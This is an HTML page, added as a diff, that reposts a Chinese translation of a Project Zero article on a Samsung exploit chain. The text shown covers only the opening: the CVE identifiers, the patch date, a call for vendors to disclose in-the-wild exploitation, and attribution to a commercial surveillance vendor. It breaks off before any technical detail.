@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>一个非常强大的剪贴板：三星野外利用链分析 - BasicBit</title>
+  <meta name="description" content="一个非常强大的剪贴板：三星野外利用链分析">
+  <link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+  <noscript><link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet"></noscript>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1206611804757181" crossorigin="anonymous"></script>
+  <style>:root{--color-primary:#4f46e5;--color-primary-hover:#4338ca;--color-primary-light:#eef2ff;--color-secondary:#64748b;--color-text:#0f172a;--color-text-secondary:#475569;--color-text-tertiary:#94a3b8;--color-border:#e2e8f0;--color-border-light:#f1f5f9;--color-bg:#ffffff;--color-bg-secondary:#f8fafc;--color-bg-tertiary:#f1f5f9;--color-accent:#f59e0b;--glass-bg:rgba(255,255,255,0.8);--glass-blur:16px;--glass-border:rgba(255,255,255,0.3);--font-primary:'Inter','Plus Jakarta Sans','Noto Sans SC',system-ui,-apple-system,sans-serif;--font-mono:'JetBrains Mono','Fira Code',monospace;--space-xs:0.5rem;--space-sm:0.75rem;--space-md:1.25rem;--space-lg:2rem;--space-xl:3.5rem;--space-2xl:5rem;--space-3xl:8rem;--shadow-sm:0 1px 2px 0 rgb(0 0 0 / 0.05);--shadow-md:0 4px 6px -1px rgb(0 0 0 / 0.1),0 2px 4px -2px rgb(0 0 0 / 0.1);--shadow-lg:0 10px 15px -3px rgb(0 0 0 / 0.1),0 4px 6px -4px rgb(0 0 0 / 0.1);--shadow-xl:0 20px 25px -5px rgb(0 0 0 / 0.1),0 8px 10px -6px rgb(0 0 0 / 0.1);--shadow-inner:inset 0 2px 4px 0 rgb(0 0 0 / 0.05);--radius-sm:0.375rem;--radius-md:0.75rem;--radius-lg:1rem;--radius-xl:1.5rem;--radius-full:9999px;--transition-fast:0.15s cubic-bezier(0.4,0,0.2,1);--transition-normal:0.3s cubic-bezier(0.4,0,0.2,1);--transition-slow:0.5s cubic-bezier(0.4,0,0.2,1);--container-max:1280px;--header-height:72px;--sidebar-width:320px}.visually-hidden{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}@font-face{font-family:'Inter';font-display:swap}@font-face{font-family:'Plus Jakarta Sans';font-display:swap}@font-face{font-family:'Noto Sans SC';font-display:swap}@font-face{font-family:'Roboto';font-display:swap}*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}html{font-size:16px;line-height:1.6;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;scroll-behavior:smooth}body{font-family:var(--font-primary);color:var(--color-text);background-color:var(--color-bg);min-height:100vh;display:flex;flex-direction:column}h1,h2,h3,h4,h5,h6{font-weight:700;line-height:1.2;color:var(--color-text);letter-spacing:-0.025em}h1{font-size:3.5rem}h2{font-size:2.25rem}h3{font-size:1.5rem}a{color:inherit;text-decoration:none;transition:all var(--transition-fast)}.container{max-width:var(--container-max);margin:0 auto;padding:0 var(--space-lg)}.site-header{background:var(--glass-bg);backdrop-filter:blur(var(--glass-blur));-webkit-backdrop-filter:blur(var(--glass-blur));border-bottom:1px solid var(--color-border-light);position:sticky;top:0;z-index:1000;height:var(--header-height);transition:all var(--transition-normal)}.header-container{max-width:var(--container-max);margin:0 auto;padding:0 var(--space-lg);height:100%;display:flex;align-items:center;justify-content:space-between}.site-logo a{font-size:1.5rem;font-weight:800;color:var(--color-text);letter-spacing:-0.05em;display:flex;align-items:center;gap:var(--space-sm)}.site-logo .logo-icon{width:36px;height:36px;flex-shrink:0}.site-logo .logo-text{background:linear-gradient(135deg,var(--color-primary) 0%,#312e81 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}.nav-list{display:flex;gap:var(--space-sm);list-style:none}.nav-list a{padding:var(--space-xs) var(--space-md);font-weight:500;color:var(--color-text-secondary);border-radius:var(--radius-full)}.nav-list a:hover,.nav-list a.active{color:var(--color-primary);background:var(--color-primary-light)}@media (max-width:768px){.site-header{backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);position:relative}}.mobile-menu-btn{display:none;background:none;border:none;cursor:pointer;padding:var(--space-xs);color:var(--color-text)}.mobile-menu-btn svg{width:28px;height:28px}.mobile-search-btn{display:none}.mobile-search-modal{display:none}@media (min-width:769px){.mobile-search-btn,.mobile-search-modal{display:none !important}}@media (max-width:768px){.mobile-menu-btn{display:flex;align-items:center;justify-content:center}.site-nav{position:absolute;top:var(--header-height);left:0;right:0;background:var(--color-bg);border-bottom:1px solid var(--color-border-light);padding:var(--space-md);box-shadow:var(--shadow-lg);transform:translateY(-100%);opacity:0;visibility:hidden;transition:all var(--transition-normal)}.site-nav.active{transform:translateY(0);opacity:1;visibility:visible}.nav-list{flex-direction:column;gap:var(--space-xs)}.nav-list a{display:block;padding:var(--space-sm) var(--space-md);border-radius:var(--radius-md)}.search-wrapper{display:none}}.search-wrapper{position:relative;width:280px}.search-form{display:flex;align-items:center;background:var(--color-bg-secondary);border:1px solid var(--color-border);border-radius:var(--radius-full);padding:0.5rem 1rem;transition:all var(--transition-fast)}.search-form:hover{background:var(--color-bg);border-color:var(--color-primary);box-shadow:var(--shadow-md)}.search-input{flex:1;border:none;background:transparent;padding:0.375rem;font-size:0.9375rem;color:var(--color-text);outline:none;width:100%;font-family:inherit}.search-input::placeholder{color:var(--color-text-tertiary)}.search-btn{background:none;border:none;cursor:pointer;color:var(--color-text-tertiary);padding:0.25rem;display:flex;align-items:center;transition:color var(--transition-fast)}.search-btn:hover{color:var(--color-primary)}.home-hero{padding:var(--space-3xl) 0 var(--space-xl);margin-top:calc(-1 * var(--space-xl));background:radial-gradient(circle at top right,var(--color-primary-light),transparent),radial-gradient(circle at bottom left,#fff9f0,transparent);text-align:center;margin-bottom:var(--space-xl)}.hero-title{font-size:4rem;margin-bottom:var(--space-md);background:linear-gradient(to right,var(--color-text),var(--color-primary));-webkit-background-clip:text;-webkit-text-fill-color:transparent}.hero-subtitle{font-size:1.25rem;color:var(--color-text-secondary);max-width:600px;margin:0 auto;font-weight:400}main{flex:1;padding-top:var(--space-xl);padding-bottom:var(--space-3xl);min-height:100vh}.about-content{max-width:800px;margin:0 auto;padding:0 var(--space-lg)}.about-content h1{font-size:2.5rem;margin-bottom:var(--space-lg)}.about-content h2{font-size:1.75rem;margin-top:var(--space-xl);margin-bottom:var(--space-md)}.about-content p{margin-bottom:var(--space-md);line-height:1.7;color:var(--color-text-secondary)}.about-content ul{margin:var(--space-md) 0;padding-left:var(--space-lg)}.about-content li{margin-bottom:var(--space-sm);color:var(--color-text-secondary)}.about-content a{color:var(--color-primary);text-decoration:underline}.about-content a:hover{color:var(--color-primary-hover)}.main-container{max-width:var(--container-max);margin:0 auto;padding:0 var(--space-lg);display:grid;grid-template-columns:1fr var(--sidebar-width);gap:var(--space-2xl);align-items:start}.main-container.post-page-no-toc{grid-template-columns:1fr}.sidebar{position:sticky;top:80px;align-self:start;max-height:calc(100vh - 100px);overflow-y:auto;z-index:50}.sidebar::-webkit-scrollbar{width:4px}.sidebar::-webkit-scrollbar-track{background:transparent}.sidebar::-webkit-scrollbar-thumb{background:var(--color-border);border-radius:2px}.post-list{display:grid;align-items:start;gap:var(--space-xl)}.post-card{background:var(--color-bg);border-radius:var(--radius-xl);padding:var(--space-xl);border:1px solid var(--color-border);transition:all var(--transition-normal);position:relative;overflow:hidden}.post-card:hover{transform:translateY(-8px);box-shadow:var(--shadow-xl);border-color:var(--color-primary-light)}.post-card::before{content:'';position:absolute;top:0;left:0;width:4px;height:100%;background:var(--color-primary);opacity:0;transition:opacity var(--transition-normal)}.post-card:hover::before{opacity:1}.post-title{font-size:2rem;margin-bottom:var(--space-sm)}.post-meta{display:flex;gap:var(--space-md);color:var(--color-text-tertiary);font-size:0.875rem;margin-bottom:var(--space-lg)}.post-excerpt{color:var(--color-text-secondary);font-size:1.125rem;margin-bottom:var(--space-lg)}.read-more{font-weight:600;color:var(--color-primary);display:inline-flex;align-items:center;gap:var(--space-xs)}.pagination{display:flex;justify-content:center;align-items:center;gap:var(--space-md);margin:var(--space-xl) 0;padding:var(--space-lg) 0}.pagination a,.pagination span{padding:var(--space-sm) var(--space-lg);border-radius:var(--radius-full);background:var(--color-bg-secondary);color:var(--color-text);text-decoration:none;font-size:0.9375rem}.pagination a:hover{background:var(--color-primary);color:white}.pagination .disabled{opacity:0.5;cursor:not-allowed}.pagination .page-info{color:var(--color-text-secondary)}.adsense{margin:var(--space-lg) 0;width:100%;display:block;min-height:1px}.adsense ins{margin:0;display:block;width:100%;min-height:1px}.adsense-floating{position:fixed;top:50%;transform:translateY(-50%);z-index:100;margin:0;width:160px;height:600px}.adsense-floating-left{left:20px}.adsense-floating-right{right:20px}@media (max-width:1400px){.adsense-floating{display:none}}.widget{background:var(--color-bg-secondary);border-radius:var(--radius-lg);padding:var(--space-lg);margin-bottom:var(--space-lg);border:1px solid var(--color-border-light)}.widget-title{font-size:0.75rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--color-text-tertiary);margin-bottom:var(--space-md)}.post-content{width:100%;max-width:1100px;margin:0 auto;padding:0 24px}.post-header{padding-top:var(--space-xl);margin-bottom:var(--space-lg)}.post-header .post-title{font-size:2.75rem;margin-bottom:var(--space-md);line-height:1.3}.article-meta{display:flex;flex-wrap:wrap;gap:var(--space-md);padding-bottom:var(--space-lg);border-bottom:1px solid var(--color-border-light)}.article-meta .meta-item{display:inline-flex;align-items:center;gap:6px;color:var(--color-text-secondary);font-size:0.9375rem}.post-body{font-size:1.25rem;line-height:1.8;padding-top:var(--space-lg)}.article-actions{display:flex;gap:var(--space-md);margin:var(--space-lg) 0;flex-wrap:wrap}.action-btn{display:inline-flex;align-items:center;gap:8px;padding:10px 18px;border-radius:var(--radius-full);font-weight:500;font-size:0.9375rem;transition:all var(--transition-fast)}.action-btn.primary{background:var(--color-primary);color:white}.action-btn.primary:hover{background:var(--color-primary-hover)}.action-btn.secondary{background:var(--color-bg-secondary);color:var(--color-text-secondary);border:1px solid var(--color-border)}.action-btn.secondary:hover{border-color:var(--color-primary);color:var(--color-primary)}.post-tags{margin-top:var(--space-xl);padding-top:var(--space-lg);border-top:1px solid var(--color-border-light);display:flex;align-items:center;gap:var(--space-sm);flex-wrap:wrap}.post-tags span{color:var(--color-text-secondary);font-size:0.9375rem}.tag-link{display:inline-block;padding:4px 12px;background:var(--color-bg-secondary);border-radius:var(--radius-full);font-size:0.875rem;color:var(--color-text-secondary);transition:all var(--transition-fast)}.tag-link:hover{background:var(--color-primary-light);color:var(--color-primary)}.post-body h1{margin-top:var(--space-xl);margin-bottom:var(--space-md);font-size:1.75rem;scroll-margin-top:80px}.post-body h2{margin-top:var(--space-xl);margin-bottom:var(--space-md);scroll-margin-top:80px}.post-body h3{margin-top:var(--space-lg);margin-bottom:var(--space-md);scroll-margin-top:80px}.post-body h4{margin-top:var(--space-lg);margin-bottom:var(--space-md);scroll-margin-top:80px}.post-body p{margin-bottom:var(--space-lg)}.post-body img{max-width:100%;height:auto;display:block;margin:var(--space-lg) auto;border-radius:var(--radius-md);box-shadow:var(--shadow-md)}.post-body img[src^="data:image"]{max-width:100%;width:auto;height:auto}.post-body img[src$=".svg"]{width:auto;height:auto}.post-body pre{background:#1e1e2e;border-radius:var(--radius-md);padding:var(--space-lg);overflow-x:auto;margin:var(--space-lg) 0;font-family:var(--font-mono);font-size:0.9375rem;line-height:1.6}.post-body code{font-family:var(--font-mono);background:var(--color-bg-secondary);padding:0.125rem 0.375rem;border-radius:var(--radius-sm);font-size:0.875em}.post-body pre code{background:none;padding:0;color:#cdd6f4}.post-body a code{color:var(--color-primary)}.post-body blockquote{margin:var(--space-lg) 0;padding:var(--space-md) var(--space-lg);border-left:4px solid var(--color-primary);background:var(--color-bg-secondary);border-radius:0 var(--radius-md) var(--radius-md) 0;color:var(--color-text-secondary);font-style:italic}.post-body blockquote p:last-child{margin-bottom:0}.post-body table{width:100%;border-collapse:collapse;margin:var(--space-lg) 0;font-size:0.9375rem}.post-body th,.post-body td{padding:var(--space-sm) var(--space-md);border:1px solid var(--color-border);text-align:left}.post-body th{background:var(--color-bg-secondary);font-weight:600;color:var(--color-text)}.post-body tr:hover{background:var(--color-bg-secondary)}.post-body .table-wrapper{overflow-x:auto;margin:var(--space-lg) 0}.post-body a:not(.tag-link):not(.action-btn):not(.read-more){color:var(--color-primary);text-decoration:underline;text-decoration-color:transparent;text-underline-offset:2px;transition:all var(--transition-fast)}.post-body a:not(.tag-link):not(.action-btn):not(.read-more):hover{text-decoration-color:var(--color-primary)}.post-body a:not(.tag-link):not(.action-btn):not(.read-more):visited{color:#7c3aed}.post-body ul,.post-body ol{margin:var(--space-md) 0;padding-left:var(--space-lg)}.post-body li{margin-bottom:var(--space-sm);line-height:1.7}.post-body li::marker{color:var(--color-primary)}.post-body hr{border:none;height:2px;background:linear-gradient(to right,transparent,var(--color-border),transparent);margin:var(--space-xl) 0}.site-footer{background:var(--color-bg-secondary);border-top:1px solid var(--color-border-light);padding:var(--space-xl) 0;margin-top:auto}.footer-container{max-width:var(--container-max);margin:0 auto;padding:0 var(--space-lg);text-align:center}.footer-content{display:flex;flex-direction:column;align-items:center;gap:var(--space-sm)}.footer-content p{color:var(--color-text-secondary);font-size:0.875rem}.footer-links{display:flex;gap:var(--space-md);margin-top:var(--space-sm)}.footer-links a{color:var(--color-text-secondary);font-size:0.875rem}.footer-links a:hover{color:var(--color-primary)}.page-header{margin-bottom:var(--space-xl)}.page-header h1{font-size:2rem;margin-bottom:var(--space-sm)}.page-header p{color:var(--color-text-secondary);font-size:1.125rem}.tag-cloud{display:flex;flex-wrap:wrap;gap:var(--space-sm);padding:var(--space-md) 0}.tag-cloud a{display:inline-block;padding:8px 16px;background:var(--color-bg-secondary);border-radius:var(--radius-full);font-size:0.9375rem;color:var(--color-text-secondary);transition:all var(--transition-fast)}.tag-cloud a:hover{background:var(--color-primary-light);color:var(--color-primary)}.category-list{list-style:none}.category-list li{display:flex;justify-content:space-between;align-items:center;padding:var(--space-sm) 0;border-bottom:1px solid var(--color-border-light)}.category-list li:last-child{border-bottom:none}.category-list a{color:var(--color-text-secondary);font-weight:500}.category-list a:hover{color:var(--color-primary)}.category-count{color:var(--color-text-tertiary);font-size:0.875rem}.category-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:var(--space-lg)}.search-box-page{margin-bottom:var(--space-xl)}.search-form-page{display:flex;gap:var(--space-sm);max-width:600px}.search-input-page{flex:1;padding:12px 20px;border:2px solid var(--color-border);border-radius:var(--radius-full);font-size:1rem;font-family:inherit;outline:none;transition:all var(--transition-fast)}.search-input-page:focus{border-color:var(--color-primary);box-shadow:0 0 0 3px var(--color-primary-light)}.search-btn-page{padding:12px 28px;background:var(--color-primary);color:white;border:none;border-radius:var(--radius-full);font-size:1rem;font-weight:500;cursor:pointer;transition:all var(--transition-fast)}.search-btn-page:hover{background:var(--color-primary-hover)}.search-results{margin-top:var(--space-lg);display:grid;gap:var(--space-xl);align-items:start}.no-results{text-align:center;padding:var(--space-2xl);color:var(--color-text-secondary)}.loading{text-align:center;padding:var(--space-lg);color:var(--color-text-secondary)}.main-container.post-page-with-toc{display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:var(--space-lg);max-width:1360px;margin:0 auto;padding:0 var(--space-lg)}.main-container.post-page-with-toc .post-content{max-width:1100px}.post-toc{position:sticky;top:80px;width:260px;max-height:calc(100vh - 100px);overflow-y:auto;padding:var(--space-md);background:var(--color-bg-secondary);border-radius:var(--radius-lg);border:1px solid var(--color-border-light);align-self:start;z-index:50}.post-toc::-webkit-scrollbar{width:4px}.post-toc::-webkit-scrollbar-track{background:transparent}.post-toc::-webkit-scrollbar-thumb{background:var(--color-border);border-radius:2px}.toc-title{font-size:0.875rem;font-weight:600;color:var(--color-text-secondary);margin-bottom:var(--space-sm);padding-bottom:var(--space-xs);border-bottom:1px solid var(--color-border-light)}.toc-list{list-style:none;margin:0;padding:0}.toc-item{margin:0}.toc-link{display:flex;align-items:center;justify-content:space-between;padding:6px 8px;font-size:0.9375rem;color:var(--color-text-secondary);border-radius:var(--radius-sm);transition:all var(--transition-fast);line-height:1.4}.toc-link:hover{background:var(--color-primary-light);color:var(--color-primary)}.toc-text{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.toc-level-0>.toc-link{font-weight:600;font-size:0.9375rem;color:var(--color-text);padding:8px}.toc-level-0>.toc-link:hover{background:var(--color-primary-light);color:var(--color-primary)}.toc-sublist{list-style:none;margin:0;padding:0 0 0 var(--space-sm);border-left:1px solid var(--color-border)}.toc-level-1>.toc-link{font-size:0.8125rem;padding:5px 8px}.toc-level-2>.toc-link{font-size:0.75rem;padding:4px 8px;color:var(--color-text-tertiary)}.toc-level-3>.toc-link{font-size:0.6875rem;padding:3px 8px;color:var(--color-text-tertiary)}.toc-fold-btn{display:flex;align-items:center;justify-content:center;width:20px;height:20px;background:none;border:none;border-radius:var(--radius-sm);color:var(--color-text-tertiary);cursor:pointer;transition:all var(--transition-fast);flex-shrink:0;margin-left:4px}.toc-fold-btn:hover{background:var(--color-bg);color:var(--color-primary)}.toc-fold-btn svg{transition:transform var(--transition-fast)}.toc-fold-btn.collapsed svg{transform:rotate(-90deg)}.toc-sublist.collapsed{display:none}@media (min-width:1025px){.sidebar{position:sticky;top:80px;align-self:start;max-height:calc(100vh - 100px);overflow-y:auto;z-index:100}.post-toc{position:sticky;top:80px;max-height:calc(100vh - 100px);overflow-y:auto;z-index:100}}@media (max-width:1400px){.post-toc{display:none}}@media (max-width:1024px){.hero-title{font-size:3rem}.main-container{grid-template-columns:1fr;align-items:start;max-width:100%;width:100%;margin:0 auto}.sidebar{display:none}.post-content{padding:0 16px;max-width:100%;width:100%}main{padding-top:var(--space-lg)}}@media (max-width:768px){.hero-title{font-size:2.5rem}:root{--space-lg:1.25rem;--space-xl:2rem;--header-height:60px}.post-card{padding:var(--space-lg)}.post-title{font-size:1.5rem}.post-content{padding:0 12px;max-width:100%;width:100%}.post-body pre{overflow-x:scroll;overflow-wrap:break-word;word-wrap:break-word;white-space:pre-wrap;font-size:0.8125rem}.post-body code{white-space:pre-wrap;word-wrap:break-word}main{padding-top:var(--space-md)}.about-content{padding:0 16px}.about-content h1{font-size:2rem}.about-content h2{font-size:1.5rem}.header-container{padding:0 1rem;gap:0.5rem}.site-logo .logo-icon{width:30px;height:30px}.site-logo .logo-text{font-size:1.25rem}.mobile-menu-btn{order:99;margin-left:auto}.site-nav{position:absolute;top:var(--header-height);left:0;right:0;background:var(--color-bg);border-bottom:1px solid var(--color-border-light);padding:var(--space-md);box-shadow:var(--shadow-lg);transform:translateY(-100%);opacity:0;visibility:hidden;transition:all var(--transition-normal)}.site-nav.active{transform:translateY(0);opacity:1;visibility:visible}.nav-list{flex-direction:column;gap:var(--space-xs)}.nav-list a{display:block;padding:var(--space-sm) var(--space-md);border-radius:var(--radius-md);font-size:1rem}.search-wrapper{display:none !important}.mobile-search-btn{display:flex !important;position:fixed;bottom:1.5rem;right:1.5rem;width:56px;height:56px;border-radius:50%;background:var(--color-primary);color:white;border:none;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(79,70,229,0.4);z-index:999;cursor:pointer;transition:all var(--transition-fast)}.mobile-search-btn:hover{background:var(--color-primary-hover);transform:scale(1.05)}.mobile-search-btn svg{width:24px;height:24px}.mobile-search-modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:1000;align-items:flex-start;justify-content:center;padding-top:20%;padding-left:1rem;padding-right:1rem}.mobile-search-modal.active{display:flex}.mobile-search-content{width:100%;max-width:400px;background:var(--color-bg);border-radius:var(--radius-xl);padding:1.5rem;box-shadow:var(--shadow-xl);position:relative}.mobile-search-form{display:flex;align-items:center;background:var(--color-bg-secondary);border:2px solid var(--color-border);border-radius:var(--radius-full);padding:0.5rem;transition:all var(--transition-fast)}.mobile-search-form:focus-within{border-color:var(--color-primary);box-shadow:0 0 0 3px var(--color-primary-light)}.mobile-search-input{flex:1;border:none;background:transparent;padding:0.5rem 0.75rem;font-size:1rem;color:var(--color-text);outline:none;font-family:inherit}.mobile-search-input::placeholder{color:var(--color-text-tertiary)}.mobile-search-submit{background:var(--color-primary);color:white;border:none;width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background var(--transition-fast)}.mobile-search-submit:hover{background:var(--color-primary-hover)}.mobile-search-close{position:absolute;top:1rem;right:1rem;background:none;border:none;cursor:pointer;color:var(--color-text-secondary);padding:0.5rem;display:flex;align-items:center;justify-content:center;transition:color var(--transition-fast)}.mobile-search-close:hover{color:var(--color-text)}.mobile-search-submit:hover{background:var(--color-primary-hover)}.main-container{padding:0 1rem;gap:var(--space-lg);max-width:100%;width:100%;margin:0 auto}.main-container.post-page-with-toc{display:block;max-width:100%}.post-list{gap:var(--space-lg)}.post-card{padding:var(--space-md);border-radius:var(--radius-lg)}.post-card>div:first-child{height:150px !important}.post-meta{flex-wrap:wrap;gap:var(--space-sm);font-size:0.8125rem}.post-excerpt{font-size:1rem;margin-bottom:var(--space-md)}.post-header{padding-top:var(--space-md)}.post-header .post-title{font-size:1.75rem}.article-meta{gap:var(--space-sm);font-size:0.875rem}.article-actions{flex-direction:column}.action-btn{width:100%;justify-content:center}.post-body{font-size:1rem;line-height:1.7}.post-body h1{font-size:1.5rem}.post-body h2{font-size:1.375rem}.post-body h3{font-size:1.25rem}.pagination{flex-wrap:wrap;gap:var(--space-sm)}.pagination a,.pagination span{padding:var(--space-xs) var(--space-md);font-size:0.875rem}.sidebar{display:none}.site-footer{padding:var(--space-lg) 0;margin-bottom:80px}.footer-content p{font-size:0.8125rem}.page-header h1{font-size:1.5rem}.page-header p{font-size:1rem}.category-grid{grid-template-columns:1fr;gap:var(--space-md)}}@media (max-width:480px){.hero-title{font-size:2rem}.hero-subtitle{font-size:1rem}.post-body{font-size:0.9375rem}.post-content{padding:0 12px;max-width:100%;width:100%}.post-body pre{font-size:0.75rem;padding:var(--space-md)}main{padding-top:var(--space-sm)}.header-container{padding:0 0.75rem}.site-logo .logo-icon{width:28px;height:28px}.site-logo .logo-text{font-size:1.125rem}.search-wrapper{bottom:0.75rem;right:0.75rem;width:calc(100% - 1.5rem)}.post-card{padding:var(--space-sm) var(--space-md)}.post-card>div:first-child{height:120px !important}.post-header .post-title{font-size:1.5rem}.article-actions{gap:var(--space-sm)}.action-btn{padding:8px 14px;font-size:0.875rem}.read-more{font-size:0.9375rem}.home-hero{padding:var(--space-xl) 0 var(--space-lg)}}@media (max-width:360px){.hero-title{font-size:1.75rem}.hero-subtitle{font-size:0.9375rem}.post-title{font-size:1.25rem}.post-header .post-title{font-size:1.375rem}.post-meta{font-size:0.75rem}.post-body{font-size:0.9375rem}}</style>
+</head>
+<body>
+  
+  <header class="site-header">
+    <div class="header-container">
+      <div class="site-logo">
+        <a href="/">
+          <svg class="logo-icon" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect width="40" height="40" rx="10" fill="url(#logo-gradient)"/>
+            <path d="M12 12H28M12 20H24M12 28H20" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+            <circle cx="30" cy="30" r="6" fill="#10b981"/>
+            <defs>
+              <linearGradient id="logo-gradient" x1="0" y1="0" x2="40" y2="40" gradientUnits="userSpaceOnUse">
+                <stop stop-color="#4f46e5"/>
+                <stop offset="1" stop-color="#312e81"/>
+              </linearGradient>
+            </defs>
+          </svg>
+          <span class="logo-text">BasicBit</span>
+        </a>
+      </div>
+      <button class="mobile-menu-btn" aria-label="菜单">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <line x1="3" y1="6" x2="21" y2="6"></line>
+          <line x1="3" y1="12" x2="21" y2="12"></line>
+          <line x1="3" y1="18" x2="21" y2="18"></line>
+        </svg>
+      </button>
+      <nav class="site-nav">
+        <ul class="nav-list">
+          <li><a href="/" class="">首页</a></li>
+          <li><a href="/category.html" class="">分类</a></li>
+          <li><a href="/tags.html" class="">标签</a></li>
+          <li><a href="/about.html" class="">关于</a></li>
+        </ul>
+      </nav>
+      <div class="search-wrapper">
+        <div class="search-box">
+          <form action="/search" method="get" class="search-form" onsubmit="return handleSearchSubmit(this)">
+            <input type="text" name="q" placeholder="搜索文章..." class="search-input">
+            <button type="button" class="search-btn" onclick="handleSearchClick(this)">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="11" cy="11" r="8"></circle>
+                <path d="m21 21-4.35-4.35"></path>
+              </svg>
+            </button>
+          </form>
+        </div>
+      </div>
+    </div>
+  </header>
+  <!-- Mobile Search Button - Outside header for proper fixed positioning -->
+  <button class="mobile-search-btn" aria-label="搜索" onclick="document.querySelector('.mobile-search-modal').classList.add('active')">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+      <circle cx="11" cy="11" r="8"></circle>
+      <path d="m21 21-4.35-4.35"></path>
+    </svg>
+  </button>
+  <!-- Mobile Search Modal -->
+  <div class="mobile-search-modal" onclick="if(event.target === this) this.classList.remove('active')">
+    <div class="mobile-search-content" onclick="event.stopPropagation()">
+      <form action="/search" method="get" class="mobile-search-form" onsubmit="this.action='/search?q='+encodeURIComponent(this.q.value);">
+        <input type="text" name="q" placeholder="搜索文章..." class="mobile-search-input" autofocus>
+        <button type="submit" class="mobile-search-submit">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="11" cy="11" r="8"></circle>
+            <path d="m21 21-4.35-4.35"></path>
+          </svg>
+        </button>
+      </form>
+    </div>
+  </div>
+  <main>
+    <div class="main-container post-page-with-toc">
+      <article class="post-content">
+        <header class="post-header">
+          <h1 class="post-title">一个非常强大的剪贴板：三星野外利用链分析</h1>
+          <div class="article-meta">
+            <span class="meta-item">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                <line x1="16" y1="2" x2="16" y2="6"></line>
+                <line x1="8" y1="2" x2="8" y2="6"></line>
+                <line x1="3" y1="10" x2="21" y2="10"></line>
+              </svg>
+              2022/11/4
+            </span>
+            <span class="meta-item">Maddie Stone</span>
+            <span class="meta-item">移动安全, 网络安全, 浏览器安全</span>
+          </div>
+        </header>
+        
+        
+    <div class="article-actions">
+      <a href="https://projectzero.google/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html" class="action-btn primary" target="_blank" rel="noopener">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+          <polyline points="15 3 21 3 21 9"></polyline>
+          <line x1="10" y1="14" x2="21" y2="3"></line>
+        </svg>
+        访问原始链接
+      </a>
+      <a href="https://translate.google.com/translate?sl=auto&tl=zh-CN&u=https%3A%2F%2Fprojectzero.google%2F2022%2F11%2Fa-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html" class="action-btn secondary" target="_blank" rel="noopener">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="2" y1="12" x2="22" y2="12"></line>
+        </svg>
+        Google 翻译
+      </a>
+    </div>
+  
+        <div class="post-body">
+          <p>作者：Maddie Stone，Project Zero</p>
+<p><strong>注</strong>：本文讨论的三个漏洞均在三星2021年3月的更新中修复。它们被分配为CVE-2021-25337、CVE-2021-25369、CVE-2021-25370。为确保您的三星设备已更新，可在设置中检查设备是否运行SMR Mar-2021或更高版本。</p>
+<p>作为防御者，野外利用样本让我们深入了解攻击者的真实行为。我们获得了关于他们所用漏洞和利用技术的&quot;真实数据&quot;，这为我们的进一步研究提供了信息，并指导安全团队关注可能产生最大影响或投资回报的领域。为此，我们需要知道这些漏洞和利用样本是在野外发现的。过去几年，供应商在透明披露已知在野外被利用的漏洞方面取得了巨大进展：Adobe、Android、Apple、ARM、Chrome、Microsoft、Mozilla等公司都通过其安全发布说明分享了这些信息。</p>
+<p>虽然我们理解三星尚未将任何漏洞标注为&quot;野外利用&quot;，但三星已承诺未来将在其发布说明中公开分享漏洞可能受到有限、针对性利用的情况。</p>
+<p>我们希望，像三星一样，其他厂商也能加入行业同行的行列，在有证据表明其产品中的漏洞在野外被利用时进行披露。</p>
+<h1 id="利用样本">利用样本</h1><p>Google威胁分析小组（TAG）获取了一个针对三星设备的部分利用链，TAG认为该利用链属于一家商业监控供应商。这些漏洞利用很可能是在测试阶段被发现的。样本来自2020年底。该利用链值得进一步分析，因为它是一个包含3个漏洞的利用链，且所有3个漏洞都位于三星自定义组件中，包括一个Java组件中的漏洞。此利用分析是与TAG的Clement Lecigne合作完成的。</p>
+<p>该样本使用了三个漏洞，均于2021年3月由三星修复：</p>
+<ol>
